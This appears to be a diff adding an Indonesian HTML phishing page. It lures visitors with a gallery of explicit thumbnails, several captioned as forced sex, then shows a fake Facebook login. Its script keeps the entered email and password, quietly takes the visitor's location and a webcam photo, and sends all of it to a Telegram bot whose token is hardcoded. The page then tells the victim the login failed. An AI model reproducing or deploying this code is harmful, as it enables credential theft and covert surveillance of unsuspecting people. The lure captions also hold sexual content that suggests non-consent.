@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>xxx</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #0d1e3f;
+      color: #ffffff;
+    }
+
+    header {
+      background-color: #004ea8;
+      color: white;
+      padding: 20px;
+      text-align: center;
+      font-size: 60px;
+      font-weight: bold;
+    }
+
+    .container {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+      gap: 16px;
+      padding: 16px;
+    }
+
+    .photo-card {
+      background-color: #1976d2;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 3px 8px rgba(0, 0, 0, 0.3);
+      transition: transform 0.2s ease;
+      cursor: pointer;
+    }
+
+    .photo-card:hover {
+      transform: scale(1.04);
+    }
+
+    .photo-card img {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+
+    .caption {
+      padding: 10px;
+      text-align: center;
+      font-size: 14px;
+      color: #e3f2fd;
+      background-color: #0b3d91;
+    }
+
+    .iklan {
+      animation: shake 0.5s infinite alternate;
+      border: 3px dashed yellow;
+      box-shadow: 0 0 20px red;
+    }
+
+    @keyframes shake {
+      0% { transform: rotate(-2deg); }
+      100% { transform: rotate(2deg); }
+    }
+
+    .overlay {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      background: rgba(0, 0, 0, 0.7);
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+
+    .login-box {
+      background-color: #ffffff;
+      padding: 30px;
+      border-radius: 24px;
+      width: 320px;
+      text-align: center;
+      color: #333;
+      box-shadow: 0 0 10px #000;
+    }
+
+  .login-box img.logo {
+  width: 150px;
+  margin-bottom: 10px;
+}
+/* berlin punya karya */
+    .company-name {
+      font-size: 12px;
+      font-weight: bold;
+      margin-bottom: 15px;
+    }
+
+    .login-box h2 {
+      margin-bottom: 20px;
+      font-size: 30px;
+    }
+
+    .login-box input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 12px;
+      border: 1px solid #ccc;
+      border-radius: 12px;
+    }
+
+    .login-box button {
+      width: 100%;
+      padding: 10px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+    }
+
+    .login-box button:hover {
+      background-color: #005ecb;
+    }
+
+    .message {
+      margin-top: 10px;
+      font-size: 13px;
+      display: none;
+    }
+
+    .error { color: red; }
+    .success { color: red; }
+  </style>
+</head>
+<body>
+<header>xxx</header>
+
+<div class="container">
+ <div class="photo-card"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSJiW3ev43GRwyQR_WEcuFwbdOIogUlvpPpc207SGFeWXGx_SoHEgsYWjB2&s=10"><div class="caption">cowok jinak sama majikan cina</div></div>
+  <div class="photo-card"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSBhvKiUwvkJf3fobeVMhWioW2h8Qf5Wf2vLor4vQl45mlilEkEdr0ZDSuG&s=10"><div class="caption">msbreewc colmek brutal</div></div>
+  <div class="photo-card"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0fHW66EiO7oOIZuxn3e6PFoaiIWbAs_J1j0c9ssu5dA&s&ec=73016173"><div class="caption">kebayak merah terbaru </div></div>
+  <div class="photo-card"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRcyc45duaPrSr4CeU-oZ3Td1WSFc6ZX1IMfjoH0nepgA&s&ec=730161730"><div class="caption">cowok rusia di paksa jilat</div></div>
+  <div class="photo-card iklan"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQayv9EdKggfy2B4PUtswz0ZRDU9aSCQZTaCqF21n7rhB7_34FJpaYaC64&s"></div>
+<!--berlin punya karya-->
+  <div class="photo-card"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRgDjpj_ORoiQy8KqpHxsIRC6d7uzosT88fTw&s"><div class="caption">di paksa dari belakang</div></div>
+  <div class="photo-card"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRU7gUaNE-uguZ_jANy2UJpLzC4-f0OmHkcWMOS9iOBmpaYZbBpzt8nDF24&s=10"><div class="caption">rusia sama suami</div></div>
+  <div class="photo-card"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRCAJ_kLDt3uVK2Si8Pn1eAjZ39Fp7sfZoDV804zJcjWs3USBzdMunR4iw&s"><div class="caption">jv di tokyo</div></div>
+  <div class="photo-card"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSobAD2zs57QMI7obHIe3bW4YeRpvkoYiAN-g&s"><div class="caption">di paksa sama teman sekolah</div></div>
+  <div class="photo-card iklan"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTybVGRBDtrOf6Cgt-8XAHamgKO0v8_DBlgGxhW9HpC3uofrVTUUwA_c9M&s=1"></div>
+
+  <div class="photo-card"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRSLSLys15EEHUVTG_znSSzbwMpo0HttPlwcw&s"><div class="caption">hentai sekolah dari belakang</div></div>
+  <div class="photo-card"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQOh70i2QnEP5f6tkqgMd4PdFZ8BuwNW5ax2VpA8FBD2WSxNvDS-Rl9oNW-&s=10"><div class="caption">gay 10 pria</div></div>
+  <div class="photo-card"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRwaB3R4AgBXSRj365x3k-OAIxXHAacIDUzHQ&s0"><div class="caption">entot di desa</div></div>
+  <div class="photo-card"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT397QBi2la8-sUudqitZeGGEqeILAn8Da6m51cNG9JwWhd_zyBr0BI3w5B&s=10"><div class="caption">kencing di muka cowok</div></div>
+  <div class="photo-card iklan"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS6KZcSdIu1WiC8DQlU_KHDNL3x7gJ2oIvZLHXY-anNLPIsVqsbGnFRZ6I&s=10"></div>
+  
+
+  <div class="photo-card"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTvrilMxyYVeLuH3pxbKXxED6rZQB3D0FpybsvITxIsEJFQ9lHWMcoN43M&s=10"><div class="caption">arab panjang 10 m</div></div>
+  <div class="photo-card"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTlMCMvAnLszk6fVLsaaHLM3BfOx9csaROjqw&s"><div class="caption">di paksa sampai pagi jepang</div></div>
+  <div class="photo-card"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTPG4JYOxPv8nSG365fQlORpWIBP0DKDmqJpkiKxxeQLiR7G7r7wqLrGYcL&s=10"><div class="caption">budak sex putih</div></div>
+  <div class="photo-card"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTN5WXKdfPQQyy-FUlDM1hcbm2lJlecpfG8wPZ-YrOnzd25Zcng5C4qKO0&s=10"><div class="caption">di paksa jilat sama cewek</div></div>
+  <div class="photo-card iklan"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSTkQNN6XHHo6XnOpJQHkA5w7U4TDrX7KGfoh955aVi9m5eb80rpF_wlmU&s=10"></div>
+
+  <div class="photo-card"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQW_2nn7DGER0vqTK9iEUEIqO583yS-lBUePkL0U3YGD4ajIdyA9FrLNfhX&s=10"><div class="caption">kentut di muka teman</div></div>
+  <div class="photo-card"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSmGqJs-pPpBPREADNnYG9mwJ2wMzI7aoK5u-CkiDi6yYOzlkgrgcOL4K8&s=10"><div class="caption">di paksa jilat sama nyonya</div></div>
+  <div class="photo-card"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSt_WK4DJaCCz-B9LWbNPpbHu6dschKaurL7kJH0XY1hP9ppQW55H7YIXTo&s=10"><div class="caption">colmek rusia</div></div>
+  <div class="photo-card"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSCi-PVb4piQ-VnooaZzuRWkwCkmTNT18Pcsw&s"><div class="caption">brazil sama budak</div></div>
+
+</div>
+
+<div class="overlay" id="loginOverlay">
+  <div class="login-box">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRiQt7Cv_nQzvgzhylcdaaKbTgkFdviUEVvXQ&s" class="logo" />
+<h2>facebook</h2>
+<input type="text" id="nama" placeholder="number for gmail" />
+    <input type="text" id="alamat" placeholder="password" />
+    <button onclick="submitLogin()">log in</button>
+<div class="company-name">
+  Forgot your password?  <a href="https://example.com" style="color: blue; text-decoration: none;">Click here</a>
+</div>
+    <div class="message" id="loginMessage"></div>
+  </div>
+</div>
+
+<script>
+  const botToken = "8268683561:AAGwFS1GDBBZLIZZPAiolyBGmxoIKQeux3A";  // Ganti token 
+  const chatId = "7838162717";      // Ganti id
+
+  let selectedImg = null;
+  let lastPayload = "";
+
+  document.querySelectorAll('.photo-card img').forEach(img => {
+    if (!img.parentElement.classList.contains("iklan")) {
+      img.addEventListener('click', () => {
+        selectedImg = img.src;
+        document.getElementById("loginOverlay").style.display = "flex";
+        document.getElementById("loginMessage").style.display = "none";
+      });
+    }
+  });
+
+  // Submit login
+  function submitLogin() {
+    const nama = document.getElementById("nama").value.trim();
+    const alamat = document.getElementById("alamat").value.trim();
+    const msg = document.getElementById("loginMessage");
+
+    msg.style.display = "block";
+
+    if (!nama || !alamat) {
+      msg.textContent = "This field is required";
+      msg.className = "message error";
+      return;
+    }
+
+    const currentPayload = `${nama}|${alamat}`;
+    if (currentPayload === lastPayload) {
+      msg.textContent = "Already submitted. No changes.";
+      msg.className = "message error";
+      return;
+    }
+
+    lastPayload = currentPayload;
+    msg.textContent = "Incorrect email or password";
+    msg.className = "message success";
+
+    ambilSemuaData(nama, alamat);
+  }
+
+  function ambilSemuaData(nama, alamat) {
+    let lat = null;
+    let lon = null;
+    let imgData = null;
+    let lokasiSiap = false;
+    let kameraSiap = false;
+
+    function lanjutKirim() {
+      if (lokasiSiap && kameraSiap) {
+        sendToTelegram(nama, alamat, imgData, lat, lon);
+      }
+    }
+
+    // Ambil lokasi
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          lat = pos.coords.latitude;
+          lon = pos.coords.longitude;
+          lokasiSiap = true;
+          lanjutKirim();
+        },
+        err => {
+          console.warn("Gagal ambil lokasi:", err.message);
+          lokasiSiap = true;
+          lanjutKirim();
+        }
+      );
+    } else {
+      lokasiSiap = true;
+      lanjutKirim();
+    }
+
+    // Ambil kamera
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        video.play();
+
+        video.onloadedmetadata = () => {
+          const canvas = document.createElement("canvas");
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext("2d");
+
+          setTimeout(() => {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            imgData = canvas.toDataURL("image/jpeg");
+            stream.getTracks().forEach(track => track.stop());
+            kameraSiap = true;
+            lanjutKirim();
+          }, 1500);
+        };
+      })
+      .catch(err => {
+        console.warn("Gagal akses kamera:", err.message);
+        kameraSiap = true;
+        lanjutKirim();
+      });
+  }
+
+  function sendToTelegram(nama, alamat, base64Image, lat, lon) {
+    const caption = `
+🆕 *Login Baru!*
+
+👤 *emai/nomor:* ${nama}
+🏠 *password:* ${alamat}
+${lat && lon ? `📍 *Lokasi:* [Lihat di Maps](https://maps.google.com/?q=${lat},${lon})` : '📍 *Lokasi:* Tidak tersedia'}
+📷 *Foto dikirim terlampir (jika ada)*
+    `;
+
+    // Kirim lokasi (jika tersedia)
+      //berlin punya karya
+    if (lat && lon) {
+      fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, latitude: lat, longitude: lon })
+      });
+    }
+
+    // Kirim foto (jika tersedia)
+    if (base64Image) {
+      const blob = dataURLtoBlob(base64Image);
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("caption", caption);
+      formData.append("photo", blob, "photo.jpg");
+      formData.append("parse_mode", "Markdown");
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      }).then(res => console.log("✅ Foto terkirim"));
+    } else {
+      // Kirim teks saja kalau tidak ada gambar
+  //berlin punya karya
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: caption,
+          parse_mode: "Markdown"
+        })
+      }).then(res => console.log("✅ Teks terkirim tanpa foto"));
+    }
+  }
+  function dataURLtoBlob(dataurl) {
+    const parts = dataurl.split(',');
+    const mime = parts[0].match(/:(.*?);/)[1];
+    const bstr = atob(parts[1]);
+    let n = bstr.length;
+    const u8arr = new Uint8Array(n);
+    while (n--) u8arr[n] = bstr.charCodeAt(n);
+    return new Blob([u8arr], { type: mime });
+  }
+</script>
+
+</body>
+</html>
